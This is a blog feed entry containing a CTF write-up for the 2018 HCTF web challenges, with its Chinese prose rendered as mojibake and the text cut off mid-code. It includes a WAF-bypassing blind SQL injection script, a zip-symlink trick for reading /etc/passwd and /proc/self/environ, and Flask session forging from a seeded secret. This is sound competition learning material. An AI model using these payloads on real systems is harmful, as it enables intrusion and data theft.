<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ‰“ä»£ç çš„æ€ªå…½ CodeMonster</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.codemonster.cn/"/>
  <updated>2018-11-12T05:11:40.211Z</updated>
  <id>https://www.codemonster.cn/</id>
  
  <author>
    <name>CodeMonster</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018 HCTF web WriteUp</title>
    <link href="https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/"/>
    <id>https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/</id>
    <published>2018-11-13T06:42:59.000Z</published>
    <updated>2018-11-12T05:11:40.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‘¨æœ«è‚äº†ä¸¤é¢˜HCTFï¼Œæ„Ÿè°¢é˜Ÿå‹ä»¬å¸¦é£ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„WEBé¢˜<br>é¡ºä¾¿æ‰“ä¸ªå°å¹¿å‘Šï¼šDe1taé•¿æœŸæ‹› é€†å‘/pwn/å¯†ç å­¦/ç¡¬ä»¶/å–è¯/æ‚é¡¹/etc. é€‰æ‰‹ï¼Œæ€¥æ‹›äºŒè¿›åˆ¶å’Œå¯†ç é€‰æ‰‹,æœ‰æ„å‘çš„å¤§ä½¬è¯·è”ç³»ZGUxdGFAcHJvdG9ubWFpbC5jb20=</p>
<a id="more"></a>
<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªQQé’“é±¼ç«™ï¼Œä¸»é¡µä¼šè·³è½¬åˆ°ç©ºé—´<br><a href="http://kzone.2018.hctf.io/www.zip" target="_blank" rel="noopener">http://kzone.2018.hctf.io/www.zip</a> å¯ä»¥ä¸‹è½½åˆ°æºç <br>install.sql æ–‡ä»¶ä¸­æœ‰adminå¯†ç ï¼Œadminã€‚<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`fish_admin`</span> (<span class="string">`id`</span>, <span class="string">`username`</span>, <span class="string">`password`</span>, <span class="string">`name`</span>, <span class="string">`qq`</span>, <span class="string">`per`</span>) <span class="keyword">VALUES</span></div><div class="line">(<span class="number">1</span>, <span class="string">'admin'</span>, <span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>, <span class="string">'å°æ°'</span>, <span class="string">'1503816935'</span>, <span class="number">1</span>);</div></pre></td></tr></table></figure></p>
<p>ä¸è¿‡ç™»é™†ä¸ä¸Šå»ï¼Œå¯†ç è¢«æ”¹äº†</p>
<p>å®¡è®¡æºç ç¿»åˆ°äº†member.phpï¼Œå‘ç°è¿™è¾¹æ²¡æœ‰addslashesï¼Œå¹¶ä¸”æ— éœ€ç™»å½•ä¹Ÿå¯è®¿é—®</p>
<p><img src="/img/2018-hctf-5.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç ä»cookieè·å–äº†ç™»é™†ä¿¡æ¯ï¼Œå¦‚æœç¬¦åˆå‡ ä¸ªifï¼Œå°±èƒ½ç™»é™†<br>æƒ³åˆ°é€šè¿‡æ³¨å…¥ ï¼Œunion select æ›¿æ¢æ‰admin_userå’Œadmin_pass<br>å°è¯•æ„é€ å¼±ç±»å‹ç»•è¿‡ï¼š<br>Cookie: PHPSESSID=s33h9c1u8bq5t0r8s4dura0c76; islogin=1; login_data={â€œadmin_userâ€:â€adminâ€™||â€™1â€,â€admin_passâ€:65}<br>ï¼ˆä¸€å¼€å§‹æ²¡æ„é€ å‡ºæ¥ï¼Œç„¶åå°±è½¬æ€è·¯å»bypass wafäº†</p>
<p>å‚è€ƒè¿™ç¯‡æ–‡ç« <br><a href="http://blog.sina.com.cn/s/blog_1574497330102wruv.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_1574497330102wruv.html</a><br>è™½ç„¶ä»–æ²¡ç»•è¿‡å…³é”®è¯æ£€æµ‹ï¼Œä½†æ˜¯é¡ºç€ä»–çš„æ€è·¯å°è¯•æ„é€ äº†<br> \u0075nionï¼Œæœ¬åœ°æµ‹è¯•å‘ç°json_decodeåå˜ä¸ºunionï¼ŒæˆåŠŸbypass waf<br>æ„é€ ä¸€ä¸ªsleepçš„cookieï¼Œæ”¾åˆ°æœåŠ¡ç«¯æµ‹è¯•ä¹Ÿsleepäº†ï¼Œè¯æ˜æ­¤å¤„æ³¨å…¥å¯è¡Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie:PHPSESSID=t0k91etf5fecbi4t25d7hprtm3;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;admin111&apos;/**/\u0075nion/**/select/**/1,2,3,4,5,6/**/from/**/fish_admin/**/where/**/\u0073leep(3)\u003d&apos;1&quot;,&quot;admin_pass&quot;:&quot;3b30a11aaba222edd6e704e9959b94643ed4ffd9&quot;&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018-hctf-6.png" alt=""></p>
<p>åé¢å°±æŠŠæ‰€æœ‰å…³é”®è¯ç”¨è¿™ç§æ–¹æ³•ç»•è¿‡ï¼Œå°±èƒ½ç›´æ¥æ³¨å…¥äº†ï¼Œæœ€åflagåœ¨ F1444gè¡¨çš„F1a9å­—æ®µ<br>é™„ä¸Šæ³¨å…¥è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#!coding:utf-8#</span></div><div class="line"><span class="comment"># xishir</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> datetime</div><div class="line"></div><div class="line"><span class="comment">#hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span></div><div class="line"></div><div class="line">ss = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+"</span></div><div class="line">r = requests.session()</div><div class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/"</span></div><div class="line"><span class="comment">#url="http://127.0.0.1/hctf/www/admin/"</span></div><div class="line"></div><div class="line">union = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'u'</span>)))[<span class="number">2</span>:]+<span class="string">'nion'</span></div><div class="line">sleep = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'leep'</span></div><div class="line">ascii = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'a'</span>)))[<span class="number">2</span>:]+<span class="string">'scii'</span></div><div class="line">ok = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'='</span>)))[<span class="number">2</span>:]</div><div class="line">substr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'ubstr'</span></div><div class="line">over = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'#'</span>)))[<span class="number">2</span>:]</div><div class="line">blank = <span class="string">"/**/"</span></div><div class="line">orr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'o'</span>)))[<span class="number">2</span>:]+<span class="string">'r'</span></div><div class="line"></div><div class="line">flag=<span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">Â  Â  <span class="keyword">print</span> i</div><div class="line">Â  Â  <span class="keyword">for</span> j <span class="keyword">in</span> ss:</div><div class="line">Â  Â  Â  Â  payload = <span class="string">"admin' and (substr((select binary F1a9 from F1444g limit 1),"</span>+str(i)+<span class="string">",1)='"</span>+str(j)+<span class="string">"') and sleep(4) and 1='1"</span></div><div class="line"></div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'sleep'</span>,sleep)</div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'union'</span>,union)</div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'='</span>,ok)</div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'#'</span>,over)</div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">' '</span>,blank)</div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'ascii'</span>,ascii)</div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'substr'</span>,substr)</div><div class="line">Â  Â  Â  Â  payload = payload.replace(<span class="string">'or'</span>,orr)</div><div class="line"></div><div class="line">Â  Â  Â  Â  jsons = <span class="string">'&#123;"admin_user":"'</span>+payload+<span class="string">'","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"&#125;'</span></div><div class="line"></div><div class="line">Â  Â  Â  Â  cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"t0k91etf5fecbi4t25d7hprtm3"</span>,</div><div class="line">Â  Â  Â  Â  <span class="string">"islogin"</span>:<span class="string">"1"</span>,</div><div class="line">Â  Â  Â  Â  <span class="string">"login_data"</span>:jsons&#125;</div><div class="line"></div><div class="line">Â  Â  Â  Â  t1=time.time()</div><div class="line">Â  Â  Â  Â  r1 = r.get(<span class="string">"http://kzone.2018.hctf.io"</span>,cookies=cookie)</div><div class="line">Â  Â  Â  Â  t2=time.time()</div><div class="line">Â  Â  Â  Â  <span class="comment">#print t2</span></div><div class="line">Â  Â  Â  Â  <span class="keyword">if</span> (t2-t1)&gt;<span class="number">4</span>:</div><div class="line">Â  Â  Â  Â  Â  Â  <span class="comment">#print "aaaaaaaa"</span></div><div class="line">Â  Â  Â  Â  Â  Â  flag+=str(j)</div><div class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">print</span> i,flag</div><div class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/2018-hctf-7.png" alt=""></p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>æ‰¾åˆ°æºç    <a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a><br><img src="/img/2018-hctf-8.png" alt=""></p>
<p><img src="/img/2018-hctf-10.png" alt=""><br>çœ‹åˆ°strlowerå‡½æ•°å¾ˆå¥‡æ€ª<br>å‚è€ƒï¼š<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>æœ€åè§£é¢˜æ­¥éª¤å¦‚ä¸‹</p>
<ol>
<li>æ³¨å†Œä¸€ä¸ªá´¬dminè´¦å·</li>
<li>ç™»é™†á´¬dminï¼Œå‘ç°é¡µé¢æ˜¾ç¤ºAdmin</li>
<li>ä¿®æ”¹å¯†ç ï¼Œé€€å‡ºç™»å½•</li>
<li>é‡æ–°ç™»é™†Adminï¼Œçœ‹åˆ°flag<br><img src="/img/2018-hctf-11.png" alt=""></li>
</ol>
<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>ä¼ ä¸ªzipï¼Œä¼šè§£å‹ç¼©å¹¶ä¸”è¯»å–<br>å°è¯•ä¼ ä¸ªé“¾æ¥æ–‡ä»¶ln -s /etc/passwd test å¹¶å‹ç¼©ä¸Šä¼ <br>è¯»åˆ°/etc/passwd</p>
<p>ç„¶åå°±æ˜¯å„ç§æ–‡ä»¶è¯»å–<br>åœ¨ /proc/self/environè¯»å–åˆ°ä¸€ä¸ªå¥½ä¸œè¥¿</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</div></pre></td></tr></table></figure>
<p>ç„¶åç›´æ¥è¯»/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniæ–‡ä»¶å¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</div></pre></td></tr></table></figure>
<p>æŒ‰éƒ¨å°±ç­è¯»å–é¡¹ç›®æ–‡ä»¶ /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py<br>å¾—åˆ°<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> flag</div><div class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</div><div class="line"><span class="keyword">import</span> os</div><div class="line">random.seed(uuid.getnode())</div><div class="line">app = Flask(__name__)</div><div class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</div><div class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></div><div class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></div><div class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></div><div class="line">Â  Â  <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</div><div class="line">Â Â  Â  Â  Â  Â  filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/', methods=['GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">Â  Â  error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</div><div class="line">Â  Â  <span class="keyword">if</span>(error == <span class="string">'1'</span>):</div><div class="line">Â  Â  Â  Â  session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</div><div class="line">Â  Â  Â  Â  <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</div><div class="line"></div><div class="line">Â  Â  <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</div><div class="line">Â  Â  Â  Â  <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</div><div class="line">Â  Â  <span class="keyword">else</span>:</div><div class="line">Â  Â  Â  Â  <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></div><div class="line">Â  Â  username=request.form[<span class="string">'username'</span>]</div><div class="line">Â  Â  password=request.form[<span class="string">'password'</span>]</div><div class="line">Â  Â  <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</div><div class="line">Â  Â  Â  Â  <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</div><div class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</div><div class="line">Â  Â  Â  Â  session[<span class="string">'username'</span>] = username</div><div class="line">Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></div><div class="line">Â  Â  session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</div><div class="line">Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line"></div><div class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></div><div class="line">Â  Â  <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</div><div class="line">Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line">Â  Â  file = request.files[<span class="string">'the_file'</span>]</div><div class="line">Â  Â  <span class="keyword">if</span> file.filename == <span class="string">''</span>:</div><div class="line">Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line">Â  Â  <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</div><div class="line">Â  Â  Â  Â  filename = secure_filename(file.filename)</div><div class="line">Â  Â  Â  Â  file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</div><div class="line">Â  Â  Â  Â  <span class="keyword">if</span>(os.path.exists(file_save_path)):</div><div class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> <span class="string">'This file already exists'</span></div><div class="line">Â  Â  Â  Â  file.save(file_save_path)</div><div class="line">Â  Â  <span class="keyword">else</span>:</div><div class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></div><div class="line"><span class="keyword">try</span>:</div><div class="line">Â  Â  Â  Â  extract_path = file_save_path + <span class="string">'_'</span></div><div class="line">Â  Â  Â  Â  os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</div><div class="line">Â  Â  Â  Â  read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</div><div class="line">Â  Â  Â  Â  file = read_obj.read()</div><div class="line">Â  Â  Â  Â  read_obj.close()</div><div class="line">Â  Â  Â  Â  os.system(<span class="string">'rm -rf '</span> + extract_path)</div><div class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">Â  Â  Â  Â  file = <span class="keyword">None</span></div><div class="line"></div><div class="line">Â  Â  os.remove(file_save_path)</div><div class="line">Â  Â  <span class="keyword">if</span>(file != <span class="keyword">None</span>):</div><div class="line">Â  Â  Â  Â  <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</div><div class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</div><div class="line">Â  Â  <span class="keyword">return</span> Response(file)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">Â  Â  <span class="comment">#app.run(debug=True)</span></div><div class="line">Â  Â  app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</div></pre></td></tr></table></figure></p>
<p>å› ä¸ºæœ‰è¿™æ®µ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</div><div class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</div></pre></td></tr></table></figure></p>
<p>å¦‚æœæ–‡ä»¶é‡Œæœ‰hctfå°±è¿”å›ä¸»é¡µ<br>æ‰€ä»¥ä¸èƒ½ç›´æ¥è¯»flag.pyï¼Œä¹Ÿæ²¡æœ‰flag.pyc<br>åé¢è¯»index.htmlå‘ç°adminç”¨æˆ·ç™»å½•å°±èƒ½çœ‹åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Â Â &#123;% if user == &apos;admin&apos; %&#125;</div><div class="line">Â  Â  Â  Â  Your flag: &lt;br&gt;</div><div class="line">Â  Â  Â  Â  &#123;&#123; flagÂ  &#125;&#125;</div></pre></td></tr></table></figure></p>
<p>æƒ³åˆ°è¦è¯»secretï¼Œä¼ªé€ adminçš„sessionï¼Œå‘ç°ä»£ç é‡Œçš„secretæ˜¯ä¼ªéšæœºçš„<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">random.seed(uuid.getnode())</div><div class="line">app = Flask(__name__)</div><div class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</div></pre></td></tr></table></figure></p>
<p>éšæœºæ•°ç§å­å›ºå®šä¸ºmacåœ°å€ï¼Œè¯»å– /sys/class/net/eth0/address å¯ä»¥å¾—åˆ°<br>ç„¶åå¸¦å…¥seedï¼Œæœ¬åœ°è·‘ä¸€ä¸‹ï¼Œç™»é™†adminæ‹¿åˆ°cookieï¼Œå†æ”¾åˆ°ç½‘ç«™ä¸Šå°±èƒ½çœ‹åˆ°flagäº†<br><img src="/img/2018-hctf-12.png" alt=""></p>
<h2 id="share"><a href="#share" class="headerlink" title="share"></a>share</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œä¸»é¡µç¿»è¯‘ä¸€ä¸‹å¯ä»¥å¾—åˆ°è¿™äº›ä¿¡æ¯</p>
<p><img src="/img/2018-hctf-1.png" alt=""><br>æ˜¯ä¸ªè®©ç”¨æˆ·åˆ†äº«åº”ç”¨çš„ç½‘ç«™ï¼Œå¹¶ä¸”ç®¡ç†å‘˜å¯ä»¥æŠŠåº”ç”¨æ¨ç»™æŸä¸ªç”¨æˆ·</p>
<p>/Alphatestå¯ä»¥çœ‹åˆ°ä¸€ä¸ªfilenumber å’Œè‡ªå·±çš„uid</p>
<p><img src="/img/2018-hctf-2.png" alt=""></p>
<p>/share å¯ä»¥åˆ†äº«ä¸œè¥¿ç»™ç®¡ç†å‘˜ï¼ŒçŒœæµ‹å­˜åœ¨xssï¼Œcontextæ¡†ä¼ äº†ä¸ªæ®µxssä»£ç ï¼Œå‘ç°èƒ½æ¥æ”¶åˆ°adminçš„è¯·æ±‚ï¼Œbotæ˜¯PhantomJS/2.1.1ï¼Œè¯´æ˜èƒ½æ‰§è¡Œjsï¼Œä½†æ˜¯å¼€äº†httponlyæ‰“ä¸åˆ°cookieï¼ŒçŒœæµ‹æ˜¯è¦CSRFï¼Œurlæ¡†ä¼ çš„ä¸œè¥¿å¥½åƒæ²¡å•¥ç”¨</p>
<p><img src="/img/2018-hctf-3.png" alt=""></p>
<p>æ ¹æ®ä¸»é¡µæç¤ºå¯èƒ½æœ‰æºç æ³„æ¼ï¼Œåœ¨robots.txt çœ‹åˆ°äº†ä¸‰ä¸ªæ¥å£çš„ä»£ç </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">/* this terrible code *<span class="regexp">/</span></div><div class="line"><span class="regexp">class FileController &lt; ApplicationController</span></div><div class="line"><span class="regexp">  before_action :authenticate_user!</span></div><div class="line"><span class="regexp">  before_action :authenticate_role</span></div><div class="line"><span class="regexp">  before_action :authenticate_admin</span></div><div class="line"><span class="regexp">  protect_from_forgery :except =&gt; [:upload , :share_people_test]</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp"># post /file</span><span class="regexp">/upload</span></div><div class="line"><span class="regexp">  def upload</span></div><div class="line"><span class="regexp">    if(params[:file][:myfile] != nil &amp;&amp; params[:file][:myfile] != "")</span></div><div class="line"><span class="regexp">      file = params[:file][:myfile]</span></div><div class="line"><span class="regexp">      name = Base64.decode64(file.original_filename)</span></div><div class="line"><span class="regexp">      ext = name.split('.')[-1]</span></div><div class="line"><span class="regexp">      if ext == name || ext ==nil</span></div><div class="line"><span class="regexp">        ext=""</span></div><div class="line"><span class="regexp">      end</span></div><div class="line"><span class="regexp">      share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public</span><span class="regexp">/upload")</span></div><div class="line"><span class="regexp">      share.write(Base64.decode64(file.read))</span></div><div class="line"><span class="regexp">      share.close</span></div><div class="line"><span class="regexp">      File.rename(share.path,share.path+"."+ext)</span></div><div class="line"><span class="regexp">      tmp = Sharefile.new</span></div><div class="line"><span class="regexp">      tmp.public = 0</span></div><div class="line"><span class="regexp">      tmp.path = share.path</span></div><div class="line"><span class="regexp">      tmp.name = name</span></div><div class="line"><span class="regexp">      tmp.tempname= 